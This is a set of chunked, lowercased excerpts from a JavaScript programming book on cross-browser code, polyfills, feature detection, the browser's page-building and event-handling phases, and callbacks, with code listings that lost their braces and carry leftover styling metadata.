n/a  n/a  n/a  n/a  ie11  n/a  n/a  n/a  n/a  edge  n/a  n/a  n/a  n/a  firefox  n/a  chrome  opera  safari  n/a  n/a", "javascript-14.1.txt__5": "when we choose to support a browser, we're typically making the following promises:  we'll actively test against that browser with our test suite.  we'll fix bugs and regressions associated with that browser.  the browser will execute our code with a reasonable level of performance.  because it's impractical to develop against lots of platform/browser combinations, we must weigh the costs versus the benefits of supporting the various browsers. this analysis must take into account multiple considerations, and the primary ones are as follows:  the expectations and needs of the target audience  the market share of the browser  the amount of effort necessary to support the browser", "javascript-14.1.txt__6": "figure 14.1 shows a sample chart that represents information on browser use (obtained from http://gs.statcounter.com for april 2016). any piece of reusable javascript code, whether it's a mass-consumption javascript library or our own onpage code, should be developed to work in as many environments as feasible, concentrating on the browsers and platforms that are important to the end user. for mass-consumption libraries, that's a large set; for more-targeted applications, the required set may be narrower.", "javascript-14.1.txt__7": "figure 14.1. looking at the usage statistics of browsers on desktop and mobile devices gives us an idea of which browsers to focus our attention on.  but it's vitally important not to bite off more than you can chew, and quality should never be sacrificed for coverage. that's important enough to repeat; in fact, we urge you to read it out loud:  quality should never be sacrificed for coverage.", "javascript-14.2.txt__1": "14.2. the five major development concerns  any piece of nontrivial code carries myriad development concerns to worry about. but five major points pose the biggest challenges to our reusable javascript code, as illustrated in figure 14.2.  figure 14.2. the five major points of concern for the development of reusable javascript  these are the five points:  browser bugs  browser bug fixes  external code  browser regressions  missing features in the browsers", "javascript-14.2.txt__2": "when striving to develop reusable javascript code, we must take all the points into consideration but pay closest attention to the most popular browsers that exist right now, because these are most likely to be used by our targeted audience. with other, less popular browsers, we should at least make sure that our code degrades gracefully. for example, if a browser doesn't support a certain api, at the very least, we should be careful that our code doesn't throw any exceptions so that the rest of the code can be executed.", "javascript-14.2.txt__3": "in the following sections, we'll break down these various concerns to get a better understanding of the challenges we're up against and how to combat them.  14.2.1. browser bugs and differences", "javascript-14.2.txt__4": "the way to achieve this is straightforward: we need a comprehensive suite of tests to cover both the common and fringe use cases of the code. with good test coverage, we can feel safe in knowing that the code we develop will work in the supported set of browsers. and assuming that no subsequent browser changes break backward compatibility, we'll have a warm, fuzzy feeling that our code will even work in future versions of those browsers. we'll be looking at specific strategies for dealing with browser bugs and differences in section 14.3.", "javascript-14.2.txt__5": "a tricky point in all of this is implementing fixes for current browser bugs in such a way that they're resistant to any fixes for those bugs that are implemented in future versions of the browser.  14.2.2. browser bug fixes", "javascript-14.2.txt__6": "when writing a piece of reusable javascript code, we want to make sure that it can last a long time. as with writing any aspect of a website (css, html, and so on), we don't want to have to go back and fix code that's broken by a new browser release.  making assumptions about browser bugs causes a common form of website breakage: specific hacks put in place to work around bugs presented by a browser that break when the browser fixes the bugs in future releases.  the problem with handling browser bugs is twofold:  our code is liable to break when the bug fix is eventually instituted.  we could end up training browser vendors to not fix bugs for fear of causing websites to break.  an interesting example of the second situation occurred just recently, with the scrolltop bug (https://dev.opera.com/articles/fixing-the-scrolltop-bug/).", "javascript-14.2.txt__7": "when faced with this inconsistency, web developers have often resorted to detecting the current name of the browser (through the user agent string, more on this later), and then modifying the scrolltop and scrollleft of the html element if our javascript code is being executed in ie or firefox, and of the body element if the code is being executed in safari, chrome, or opera. unfortunately, this way of circumventing this bug has proved to be disastrous. because many pages now explicitly encode \u201cif this is safari, chrome, or opera,\u201d modify the body element, these browsers can't really fix this bug, because the bug fix would, ironically, cause failures in many web pages.", "javascript-14.2.txt__8": "this brings up another important point concerning bugs: when determining whether a piece of functionality is potentially a bug, always verify it with the specification!", "javascript-14.2.txt__9": "additionally, there's a distinction between bug fixes and api changes. whereas bug fixes are easily foreseen\u2014a browser will eventually fix the bugs in its implementation, even if it takes a long time\u2014api changes are much harder to spot. standard apis are unlikely to change (though it's not completely unheard of); changes are much more likely to occur with unspecified apis.", "javascript-14.2.txt__10": "luckily, this rarely happens in a way that will massively break most web applications. but if it does, it's effectively undetectable in advance (unless, of course, we test every single api that we ever touch\u2014but the overhead incurred in such a process would be ludicrous). api changes of this sort should be handled like any other regression.", "javascript-14.2.txt__11": "for our next point of concern, we know that no man is an island, and neither is our code. let's explore the ramifications.  14.2.3. external code and markup  any reusable code must coexist with the code that surrounds it. whether we're expecting our code to work on pages that we write or on websites developed by others, we need to ensure that it can exist on the page with any other random code.  this is a double-edged sword: our code not only must be able to withstand living with potentially poorly written external code, but also must take care not to have adverse effects on the code with which it lives.", "javascript-14.2.txt__12": "tip  this is an important enough concern to warrant an entire book on the subject. if you'd like to delve more deeply, we highly recommend third-party javascript by ben vinegar and anton kovalyov (manning, 2013, https://www.manning.com/books/third-party-javascript).  if we're developing code that will have a broad level of applicability in unknown (and uncontrollable) environments, we'll need to make doubly sure that our code is robust. let's discuss some strategies to achieve that.  encapsulating our code", "javascript-14.2.txt__13": "keeping an incredibly small global footprint when introducing our code into a page can go a long way toward making aunt mathilda happy. in fact, keeping our global footprint to a handful of global variables, or better yet, one, is fairly easy.", "javascript-14.2.txt__14": "almost all operations in jquery are made via the jquery function. and any other functions that it provides (called utility functions) are defined as properties of jquery (remember from chapter 3 how easy it is to define functions that are properties of other functions), thus using the name jquery as a namespace for all its definitions.", "javascript-14.2.txt__15": "we can use the same strategy. let's say that we're defining a set of functions for our own use, or for the use of others, that we'll group under a namespace of our own choosing\u2014say, ninja.  we could, like jquery, define a global function named ninja()that performs various operations based on what we pass to the function. for example:  var ninja = function(){ /* implementation code goes here */ }  defining our own utility functions that use this function as their namespace is easy:  ninja.hitsuke = function(){ /* code to distract guards with fire here */ }  if we didn't want or need ninja to be a function but only to serve as a namespace, we could define it as follows:  var ninja = {};  this creates an empty object in which we can define properties and functions in order to keep from adding these names to the global namespace.  other practices that we want to avoid, in order to keep our code encapsulated, are modifying any existing variables, function prototypes, or even dom elements. any aspect of the page that our code modifies, outside itself, is a potential area for collision and confusion.  the other side of the two-way street is that even if we follow best practices and carefully encapsulate our code, we can't be assured that code we haven't written is going to be as well-behaved.  dealing with less-than-exemplary code", "javascript-14.2.txt__16": "some code, even if well-written, might intentionally be doing things like modifying function prototypes, object properties, and dom element methods. this practice, well-meant or otherwise, can lay traps for us to step into.", "javascript-14.2.txt__17": "unfortunately, there aren't many steadfast rules when dealing with situations of this nature, but we can take some mitigating steps. the next few sections introduce these defensive steps.  coping with greedy ids", "javascript-14.2.txt__18": "take a look at the following html snippet to observe the nastiness that can ensue as a result of these greedy ids:  <form id=\"form\" action=\"/conceal\">  <input type=\"text\" id=\"action\"/>  <input type=\"submit\" id=\"submit\"/>  </form>  now, in the browsers, let's call this:  var what = document.getelementbyid('form').action;  rightly, we'd expect this to be the value of the form's action attribute. and in most cases, it would be. but if we inspect the value of variable what, we find that it's instead a reference to the input#action element! huh?  let's try something else:  document.getelementbyid('form').submit();  this statement should cause the form to be submitted, but instead, we get a script error:  uncaught typeerror: property 'submit' of object #<htmlformelement> is not a function  what's going on?", "javascript-14.2.txt__19": "so, before the input#submit element is created, the reference form.action points to the value of the action attribute for the <form>. afterward, it points to the input#submit element. the same thing happens to form.submit. yeesh!", "javascript-14.2.txt__20": "in any case, this particular \u201cfeature\u201d of the browsers can cause numerous and mystifying problems in our code, and we should keep it in mind when debugging. when we encounter properties that have seemingly been inexplicably transformed into something other than what we expect, dom clobbering is a likely culprit.", "javascript-14.2.txt__21": "luckily, we can avoid this problem in our own markup by avoiding simple id and name values that can conflict with standard property names, and we can encourage others to do the same. the value submit is especially to be avoided, as it's a common source of frustrating and perplexing buggy behavior.  loading order of style sheets and scripts  often we'll expect css rules to already be available by the time our code executes. one of the best ways to ensure that css rules provided by style sheets are defined when our javascript code executes is to include the external style sheets prior to including the external script files.  not doing so can cause unexpected results, because the script attempts to access the as-yet-undefined style information. unfortunately, this issue can't easily be rectified with pure javascript and should instead be handled with user documentation.", "javascript-14.2.txt__22": "it's unfortunate that there are no better and deterministic solutions to handling these integration issues other than to take some smart first steps and to write our code defensively. we'll now move on to the next point of concern.  14.2.4. regressions  regressions are one of the hardest problems we'll encounter in creating reusable and maintainable javascript code. these are bugs, or non-backward-compatible api changes (mostly to unspecified apis), that browsers have introduced and that cause code to break in unpredictable ways.  note  here we're using the term regression in its classical definition: a feature that used to work but no longer functions as expected. this is usually unintentional, but it's sometimes caused by deliberate changes that break existing code.  anticipating changes", "javascript-14.2.txt__23": "listing 14.1. anticipating an upcoming api change  function bindevent(element, type, handle) {  if (element.addeventlistener) {  element.addeventlistener(type, handle, false);  #a  else if (element.attachevent) {  element.attachevent(\"on\" + type, handle);  #b  #a - binds using the standard api  #b - binds using a proprietary api  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-14.2.txt__24": "most future api changes, alas, aren't that easy to predict, and there's no way to predict upcoming bugs. this is but one of the important reasons that we've stressed testing throughout this book. in the face of unpredictable changes that will affect our code, the best that we can hope for is to be diligent in monitoring our tests for each browser release, and to quickly address issues that regressions may introduce.", "javascript-14.2.txt__25": "having a good suite of tests and keeping close track of upcoming browser releases is absolutely the best way to deal with future regressions of this nature. it doesn't have to be taxing on your normal development cycle, which should already include routine testing. running these tests on new browser releases should always be factored into the planning of any development cycle.", "javascript-14.2.txt__26": "you can get information on upcoming browser releases from the following locations:  microsoft edge (a successor to ie): http://blogs.windows.com/msedgedev/  firefox: http://ftp.mozilla.org/pub/firefox/nightly/latest-trunk/  webkit (safari): https://webkit.org/nightly/  opera: https://dev.opera.com/  chrome: http://chrome.blogspot.hr/  diligence is important. because we can never fully predict the bugs that will be introduced by a browser, it's best to make sure that we stay on top of our code and quickly avert any crises that may arise.", "javascript-14.2.txt__27": "in this section, we've gone through four major points of concern for the development of reusable javascript: browser bugs, browser bug fixes, external code, and browser regressions. the fifth point\u2014missing features in the browsers\u2014deserves a special mention, so we cover it in the next section, alongside other implementation strategies relevant for cross-browser web applications.", "javascript-14.3.txt__1": "14.3. implementation strategies  knowing which issues to be aware of is only half the battle. figuring out effective solutions and using them to implement robust cross-browser code is another matter.  a wide range of strategies are available, and although not every strategy will work in every situation, the range presented in this section covers most of the concerns that we'll need to address within our robust code bases. let's start with something that's easy and almost trouble free.  14.3.1. safe cross-browser fixes  the simplest (and safest) classes of cross-browser fixes are those that exhibit two important traits:  they have no negative effects or side effects on other browsers.  they use no form of browser or feature detection.  the instances for applying these fixes may be rare, but they're a tactic that we should always strive for in our applications.  let's look at an example. the following code snippet represents a change (plucked from jquery) that came about when working with internet explorer:  // ignore negative width and height values  if ((key == 'width' || key == 'height') && parsefloat(value) < 0)  value = undefined;", "javascript-14.3.txt__2": "another example of this type of fix (also from jquery) appears in the attribute manipulation code. consider this:  if (name == \"type\" &&  elem.nodename.tolowercase()== \"input\" &&  elem.parentnode)  throw \"type attribute can't be changed\";", "javascript-14.3.txt__3": "this change to the jquery code base requires no browser or feature detection; it unifies the api across all browsers. the action still results in an exception, but that exception is uniform across all browser types.", "javascript-14.3.txt__4": "the important thing to remember for these types of code changes is that they provide a solution that works seamlessly across browsers without the need for browser or feature detection, effectively making them immune to changes going forward. you should always strive for solutions that work in this manner, even if the applicable instances are few and far between.", "javascript-14.3.txt__5": "14.3.2. feature detection and polyfills", "javascript-14.3.txt__6": "most commonly, feature detection is used to choose between multiple apis that provide duplicate pieces of functionality. for example, chapter 10 explored the find method, accessible to all arrays, a method that we can use to find the first array item that satisfies a certain condition. unfortunately, the method is accessible only in browsers that fully support es6. so what do we do when we're stuck with browsers that still don't support this feature? in general, how do we deal with missing features in the browsers?", "javascript-14.3.txt__7": "the answer is polyfilling! a polyfill is a browser fallback. if a browser doesn't support a particular functionality, we provide our own implementation. for example, the mozilla developer network (mdn) provides polyfills for a wide range of es6 functionality. among other things, this includes the javascript implementation of the array.prototype.find method (http://mng.bz/d9lu), as shown in the following listing.", "javascript-14.3.txt__8": "listing 14.2. a polyfill for the array.prototype.find method  if (!array.prototype.find) {  #a  array.prototype.find = function(predicate) {  #b  if (this === null) {  throw new typeerror('find called on null or undefined');  if (typeof predicate !== 'function') {  throw new typeerror('predicate must be a function');  var list = object(this);  var length = list.length >>> 0;  #c  var thisarg = arguments[1];  var value;  for (var i = 0; i < length; i++) {  #d  value = list[i];  #d  if (predicate.call(thisarg, value, i, list)) {  #d  return value;  #d  #d  #d  return undefined;  };  #a - provides a polyfill only if the current browser doesn't implement the method  #b - specifies our own implementation  #c - makes sure that length is a non-negative integer  #d - finds the first array item that satisfies a predicate  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  in this example, we first use feature detection to check whether the current browser has built-in support for the find method:  if (!array.prototype.find) {  ...", "javascript-14.3.txt__9": "it turns out that the core of the method is straightforward. we loop through the array, calling the passed-in predicate function, which checks whether an array item satisfies our criteria. if it does, we return it.  one interesting technique is presented in this listing:  var length = list.length >>> 0;", "javascript-14.3.txt__10": "an important use of feature detection is discovering the facilities provided by the browser environment in which the code is executing. this allows us to provide features that use those facilities in our code, or to determine whether we need to provide a fallback.  the following code snippet shows a basic example of detecting the presence of a browser feature by using feature detection, to determine whether we should provide full application functionality or a reduced-experience fallback:  if (typeof document !== \"undefined\" &&  document.addeventlistener &&  document.queryselector &&  document.queryselectorall) {  // we have enough of an api to work with to build our application  else {  // provide fallback  here, we test whether  the browser has a document loaded  the browser provides a means to bind event handlers  the browser can find elements based on a selector  failing any of these tests causes us to resort to a fallback position. what is done in the fallback is up to the expectations of the consumers of the code, and the requirements placed on the code. a few options can be considered:  we could perform further feature detection to figure out how to provide a reduced experience that still uses some javascript.  we could opt to not execute any javascript, falling back to the unscripted html on the page.  we could redirect the user to a plainer version of the site. google does this with gmail, for example.", "javascript-14.3.txt__11": "14.3.3. untestable browser issues", "javascript-14.3.txt__12": "the following sections discuss some known issues that are impossible to test using any conventional javascript interactions.  event handler bindings", "javascript-14.3.txt__13": "event firing  another aggravation is determining whether an event will fire. although it's possible to determine whether a browser supports a means of binding an event, it's not possible to know whether a browser will fire an event. this becomes problematic in a couple of places.", "javascript-14.3.txt__14": "the second situation occurs if a script wants to use custom events provided by a browser as an alternative. for example, internet explorer provides mouseenter and mouseleave events, which simplify the process of determining when a user's mouse enters or leaves an element's boundaries. these are frequently used as alternatives to the mouseover and mouseout events, because they act slightly more intuitively than the standard events. but because there's no way of determining whether these events will fire without first binding the events and waiting for a user interaction against them, it's hard to use them in reusable code.", "javascript-14.3.txt__15": "css property effects", "javascript-14.3.txt__16": "there's no way to programmatically determine whether changing these style properties will generate the effects desired. the only way to verify the impact is through a visual examination of the page.  browser crashes  testing script that causes the browser to crash is another annoyance. code that causes a browser to crash is especially problematic, because unlike exceptions that can be easily caught and handled, these will always cause the browser to break.  for example, in older versions of safari (see http://bugs.jquery.com/ticket/1331), creating a regular expression that used unicode-character ranges would always cause the browser to crash, as in the following example:  new regexp(\"[\\\\w\\u0128-\\uffff*_-]+\");  the problem with this is that it's not possible to test whether this problem exists, because the test itself will always produce a crash in that older browser.  additionally, bugs that cause crashes to occur forever become embroiled in difficulty, because although it may be acceptable for javascript to be disabled in some segment of the population using your browser, it's never acceptable to outright crash the browser of those users.  incongruous apis", "javascript-14.3.txt__17": "in addition to impossible-to-test problems, some issues are possible to test but are prohibitively difficult to test effectively. let's look at some of them.  api performance  sometimes specific apis are faster or slower in different browsers. when writing reusable and robust code, it's important to try to use the apis that provide good performance. but it's not always obvious which api that is.  effectively conducting performance analysis of a feature usually entails throwing a large amount of data at it, and that typically takes a relatively long time. therefore, it's not something we can do whenever our page is loaded.", "javascript-14.4.txt__1": "14.4. reducing assumptions  writing cross-browser, reusable code is a battle of assumptions, but by using clever detection and authoring, we can reduce the number of assumptions that we make in our code. when we make assumptions about the code that we write, we stand to encounter problems further down the road.", "javascript-14.4.txt__2": "the most common area for making assumptions in javascript is in user-agent detection\u2014specifically, analyzing the user agent provided by a browser (navigator.useragent) and using it to make an assumption about how the browser will behave (in other words, browser detection). unfortunately, most user-agent string analysis proves to be a superb source of future-induced errors. assuming that a bug, issue, or proprietary feature will always be linked to a specific browser is a recipe for disaster.", "javascript-14.4.txt__3": "but reality intervenes when it comes to minimizing assumptions: it's virtually impossible to remove all of them. at some point, we'll have to assume that a browser will do what it's supposed to do. figuring out where to strike that balance is completely up to the developer, and it's what \u201cseparates the men from the boys,\u201d as they say (with apologies to our female readers).", "javascript-14.4.txt__4": "for example, let's reexamine the event-attaching code that we've already seen in this chapter:  function bindevent(element, type, handle) {  if (element.addeventlistener) {  element.addeventlistener(type, handle, false);  else if (element.attachevent) {  element.attachevent(\"on\" + type, handle);  without looking ahead, see if you can spot three assumptions made by this code. go on, we'll wait. (jeopardy theme plays...)  how'd you do? the preceding code has at least these three assumptions:  the properties that we're checking are callable functions.  they're the correct functions, performing the actions that we expect.  these two methods are the only possible ways of binding an event.  we could easily get rid of the first assumption by adding checks to see whether the properties are, in fact, functions. tackling the remaining two points is much more difficult.", "javascript-2.2.1.txt__1": "2.2.1. parsing the html and building the dom", "javascript-2.2.1.txt__2": "figure 2.4. by the time the browser encounters the first script element, it has already created a dom with multiple html elements (the nodes on the right).  notice how the nodes in figure 2.4 are organized such that each node except the first one (the root html node ) has exactly one parent. for example, the head node  has the html node  as its parent. at the same time, a node can have any number of children. for example, the html node  has two children: the head node  and the body node . children of the same element are called siblings. (the head node  and the body node  are siblings.)", "javascript-2.2.1.txt__3": "figure 2.5. an example of invalid html that is fixed by the browser", "javascript-2.2.2.txt__1": "2.2.2. executing javascript code", "javascript-2.2.2.txt__2": "global objects in javascript", "javascript-2.2.2.txt__3": "let's look at a snippet of code from listing 2.1:  var first = document.getelementbyid(\"first\");", "javascript-2.2.2.txt__4": "browser apis", "javascript-2.2.2.txt__5": "with this basic understanding of the global objects provided by the browser, let's look at two different types of javascript code that define exactly when that code is executed.  different types of javascript code  we broadly differentiate between two different types of javascript code: global code and function code. the following listing will help you understand the differences between these two types of code.  listing 2.2. global and function javascript code  <script>  function addmessage(element, message){  var messageelement = document.createelement(\"li\");  #a  messageelement.textcontent = message;  #a  element.appendchild(messageelement);  #a  var first = document.getelementbyid(\"first\");  #b  addmessage(first, \"page loading\");  #b  </script>  #a - function code is the code contained in a function.  #b - global code is the code outside functions.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  the main difference between these two types of code is their placement: the code contained in a function is called function code, whereas the code placed outside all functions is called global code.", "javascript-2.2.2.txt__6": "figure 2.6. program execution flow when executing javascript code  on the other hand, function code, in order to be executed, has to be called by something else: either by global code (for example, the addmessage function call in the global code causes the execution of the addmessage function code), by some other function, or by the browser (more on this soon).  executing javascript code in the page-building phase", "javascript-2.2.2.txt__7": "figure 2.7 shows the state of the dom after the global javascript code has been executed. let's walk slowly through its execution. first a function addmessage is defined:  function addmessage(element, message){  var messageelement = document.createelement(\"li\");  messageelement.textcontent = message;  element.appendchild(messageelement);  figure 2.7. the dom of the page after executing the javascript code contained in the script element  then an existing element is fetched from the dom by using the global document object and its getelementbyid method:  var first = document.getelementbyid(\"first\");  this is followed by a call to the addmessage function  addmessage(first, \"page loading\");  which causes the creation of a new li element, the modification of its text content, and finally its insertion into the dom.", "javascript-2.2.2.txt__8": "once the javascript engine executes the last line of javascript code in the script element (in figure 2.5, this means returning from the addmessage function), the browser exits the javascript execution mode and continues building dom nodes by processing the remaining html code. if, during that processing, the browser again encounters a script element, the dom creation from html code is again paused, and the javascript runtime starts executing the contained javascript code. it's important to note that the global state of the javascript application persists in the meantime. all user-defined global variables created during the execution of javascript code in one script element are normally accessible to javascript code in other script elements. this happens because the global window object, which stores all global javascript variables, is alive and accessible during the entire lifecycle of the page.", "javascript-2.2.txt__1": "2.2. the page-building phase", "javascript-2.2.txt__2": "parsing the html and building the document object model (dom)  executing javascript code", "javascript-2.3.1.txt__1": "2.3.1. event-handling overview", "javascript-2.3.1.txt__2": "whenever an event occurs, the browser should execute the associated event-handler function. but there's no guarantee that we have extremely patient users who will always wait an appropriate amount of time before triggering another event. for this reason, the browser needs a way to keep track of the events that have occurred but have yet to be processed. to do this, the browser uses an event queue, as shown in figure 2.8.", "javascript-2.3.1.txt__3": "figure 2.8. in the event-handling phase, all events (whether coming from the user, such as mouse clicks and key presses, or coming from the server, such as ajax events) are queued up as they occur and are processed as the single thread of execution allows.", "javascript-2.3.1.txt__4": "the browser checks the head of the event queue.  if there are no events, the browser keeps checking.  if there's an event at the head of the event queue, the browser takes it and executes the associated handler (if one exists). during this execution, the rest of the events patiently wait in the event queue for their turn to be processed.", "javascript-2.3.1.txt__5": "it's important to note that the browser mechanism that puts events onto the queue is external to the page-building and event-handling phases. the processing that's necessary to determine when events have occurred and that pushes them onto the event queue doesn't participate in the thread that's handling the events.", "javascript-2.3.1.txt__6": "events are asynchronous  events, when they happen, can occur at unpredictable times and in an unpredictable order (it's tricky to force users to press keys or click in some particular order). we say that the handling of events, and therefore the invocation of their handling functions, is asynchronous.  the following types of events can occur, among others:  browser events, such as when a page is finished loading or when it's to be unloaded  network events, such as responses coming from the server (ajax events, server-side events)  user events, such as mouse clicks, mouse moves, and key presses  timer events, such as when a timeout expires or an interval fires  the vast majority of code executes as a result of such events!", "javascript-2.3.2.txt__1": "2.3.2. registering event handlers", "javascript-2.3.2.txt__2": "by assigning functions to special properties  by using the built-in addeventlistener method  for example, writing the following code assigns a function to the special onload property of the window object:  window.onload = function(){};", "javascript-2.3.2.txt__3": "document.body.onclick = function(){};", "javascript-2.3.2.txt__4": "listing 2.3. registering event handlers  <script>  document.body.addeventlistener(\"mousemove\", function() {  #a  var second = document.getelementbyid(\"second\");  addmessage(second, \"event: mousemove\");  });  document.body.addeventlistener(\"click\", function(){  #b  var second = document.getelementbyid(\"second\");  addmessage(second, \"event: click\");  });  </script>  #a - registers a handler for the mousemove event  #b - registers a handler for the click event  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-2.3.3.txt__1": "2.3.3. handling events", "javascript-2.3.3.txt__2": "let's go back to the application from listing 2.1. figure 2.9 shows an example execution in which a quick user has moved and clicked a mouse.  figure 2.9. example of an event-handling phase in which two events\u2014mousemove and click\u2014are handled  let's examine what's going on here. as a response to these user actions, the browser puts the mousemove and click events onto the event queue in the order in which they have occurred: first the mousemove event and then the click event .", "javascript-2.3.3.txt__3": "now that we have a sense of the overall steps that happen in the event-handling phase, let's see how this execution influences the dom (figure 2.10). the execution of the mousemove handler selects the second list element with id second and, by using the addmessage function, adds a new list item element", "javascript-2.3.txt__1": "2.3. event handling", "javascript-2.4.txt__1": "2.4. summary  the html code received by the browser is used as a blueprint for creating the dom, an internal representation of the structure of a client-side web application.  we use javascript code to dynamically modify the dom to bring dynamic behavior to web applications.  the execution of client-side web applications is performed in two phases:", "javascript-2.4.txt__2": "event handling\u2014 various events are processed one at a time, in the order in which they were generated. the event-handling phase relies heavily on the event queue, in which all events are stored in the order in which they occurred. the event loop always checks the top of the queue for events, and if an event is found, the matching event-handler function is invoked.", "javascript-3.1.1.txt__1": "3.1.1. functions as first-class objects  functions in javascript possess all the capabilities of objects and are thus treated like any other object in the language. we say that functions are first-class objects, which can also be  created via literals  function ninjafunction() {}  assigned to variables, array entries, and properties of other objects  var ninjafunction = function() {};  #a  ninjaarray.push(function(){});  #b  ninja.data = function(){};  #c  #a - assigns a new function to a variable  #b - adds a new function to an array  #c - assigns a new function as a property of another object  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  passed as arguments to other functions  function call(ninjafunction){  ninjafunction();  call(function(){});  #a  #a - a newly created function passed as an argument to a function  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":5,\\\"ch\\\":0},{\\\"line\\\":5,\\\"ch\\\":65}]]\"}  !@%style%@!  returned as values from functions  function returnnewninjafunction() {  return function(){};  #a  #a - returns a new function  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":4,\\\"ch\\\":0},{\\\"line\\\":4,\\\"ch\\\":27}]]\"}  !@%style%@!  they can possess properties that can be dynamically created and assigned:  var ninjafunction = function(){};  ninjafunction.name = \"hanzo\";  #a  #a - adds a new property to a function  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":3,\\\"ch\\\":0},{\\\"line\\\":3,\\\"ch\\\":38}]]\"}  !@%style%@!  whatever we can do with objects, we can do with functions as well. functions are objects, just with an additional, special capability of being invokable: functions can be called or invoked in order to perform an action.  functional programming in javascript", "javascript-3.1.1.txt__2": "one of the characteristics of first-class objects is that they can be passed to functions as arguments. in the case of functions, this means that we pass a function as an argument to another function that might, at a later point in application execution, call the passed-in function. this is an example of a more general concept known as a callback function. let's explore this important concept.", "javascript-3.1.2.txt__1": "3.1.2. callback functions  whenever we set up a function to be called at a later time, whether by the browser in the event-handling phase or by other code, we're setting up a callback. the term stems from the fact that we're establishing a function that other code will later \u201ccall back\u201d at an appropriate point of execution.  callbacks are an essential part of using javascript effectively, and we're willing to bet that you already use them in your code a lot\u2014whether executing code on a button click, receiving data from a server, or animating parts of your ui.", "javascript-3.1.2.txt__2": "function useless(ninjacallback) {  return ninjacallback();  as useless as this function is, it demonstrates the ability to pass a function as an argument to another function, and to subsequently invoke that function through the passed parameter.  we can test this useless function with the code in the following listing.  listing 3.1. a simple callback example  var text = \"domo arigato!\";  report(\"before defining functions\");  function useless(ninjacallback) {  #a  report(\"in useless function\");  #a  return ninjacallback();  #a  #a  function gettext() {  #b  report(\"in gettext function\");  #b  return text;  #b  #b  report(\"before making all the calls\");  assert(useless(gettext) === text,  #c  \"the useless function works! \" + text);  #c  report(\"after the calls have been made\");  #a - defines a function that takes a callback function and immediately invokes it  #b - defines a simple function that returns a global variable  #c - calls our useless function with the gettext function as a callback  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-3.1.2.txt__3": "when we run this code, we end up with the result shown in figure 3.1. as you can see, calling the useless function with our gettext callback function as an argument returns the expected value.  figure 3.1. the result of running the code from listing 3.1", "javascript-3.1.2.txt__4": "figure 3.2. the flow of execution when making the useless(gettext) call. the useless function is called with gettext as an argument. in the body of the useless function is a call to the passed-in function, which in this case triggers the execution of the gettext function (we've \u201ccalled back\u201d to the gettext function).", "javascript-3.1.2.txt__5": "this is easy, because javascript's functional nature lets us deal with functions as first-class objects. we can even take the whole thing a step further, by rewriting our code in the following manner:  var text = 'domo arigato!';  function useless(ninjacallback) {  return ninjacallback();  assert(useless(function () { return text;}) === text,  #a  \"the useless function works! \" + text);  #a - defines a callback function directly as an argument  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":6,\\\"ch\\\":15},{\\\"line\\\":6,\\\"ch\\\":42}],[{\\\"line\\\":9,\\\"ch\\\":0},{\\\"line\\\":9,\\\"ch\\\":56}]]\"}  !@%style%@!", "javascript-3.1.2.txt__6": "in the preceding example of a callback, we called our own callback. but callbacks can also be called by the browser. think back to chapter 2, which has an example with the following snippet:  document.body.addeventlistener(\"mousemove\", function() {  var second = document.getelementbyid(\"second\");  addmessage(second, \"event: mousemove\");  });  that's also a callback function, one that's defined as an event handler to the mousemove event, and that will be called by the browser when that event occurs.  note", "javascript-3.1.2.txt__7": "now let's consider a use of callbacks that will greatly simplify how we sort collections.  sorting with a comparator  almost as soon as we have a collection of data, odds are we're going to need to sort it. let's say that we have an array of numbers in a random order: 0, 3, 2, 5, 7, 4, 8, 1. that order might be just fine, but chances are that, sooner or later, we'll want to rearrange it.", "javascript-3.1.2.txt__8": "this is where callbacks jump in! instead of letting the sort algorithm decide what values go before other values, we'll provide a function that performs the comparison. we'll give the sort algorithm access to this function as a callback, and the algorithm will call the callback whenever it needs to make a comparison. the callback is expected to return a positive number if the order of the passed values should be reversed, a negative number if not, and zero if the values are equal; subtracting the compared values produces the desired return value to sort the array:", "javascript-3.1.2.txt__9": "var values = [0, 3, 2, 5, 7, 4, 8, 1];  values.sort(function(value1, value2){  return value1 - value2;  });  there's no need to think about the low-level details of a sorting algorithm (or even which sorting algorithm to choose). we provide a callback that the javascript engine will call every time it needs to compare two items.", "javascript-3.1.txt__1": "3.1. what's with the functional difference?", "javascript-3.1.txt__2": "because most of our code will run as the result of a function invocation, you'll see that having functions that are versatile and powerful constructs gives us a great deal of flexibility and sway when writing code. significant chunks of this book explain just how the nature of functions as first-class objects can be exploited to our great benefit. but first, let's take a look at some of the actions we can take with objects. in javascript, objects enjoy certain capabilities:", "javascript-3.2.1.txt__1": "3.2.1. storing functions", "javascript-3.2.1.txt__2": "an obvious, but na\u00efve, technique is to store all the functions in an array and loop through the array, checking for duplicate functions. unfortunately, this performs poorly, and as a ninja, we want to make things work well, not merely work. we can use function properties to achieve this with an appropriate level of sophistication, as shown in the next listing.", "javascript-3.2.1.txt__3": "listing 3.2. storing a collection of unique functions  var store = {  nextid: 1,  #a  cache: {},  #b  add: function(fn) {  #c  if (!fn.id) {  #c  fn.id = this.nextid++;  #c  this.cache[fn.id] = fn;  #c  return true;  #c  #c  #c  };  function ninja(){}  assert(store.add(ninja),  #d  \"function was safely added.\");  #d  assert(!store.add(ninja),  #d  \"but it was only added once.\");  #d  #a - keeps track of the next available id to be assigned  #b - creates an object to serve as a cache in which we'll store functions  #c - adds functions to the cache, but only if they're unique  #d - tests that all works as planned  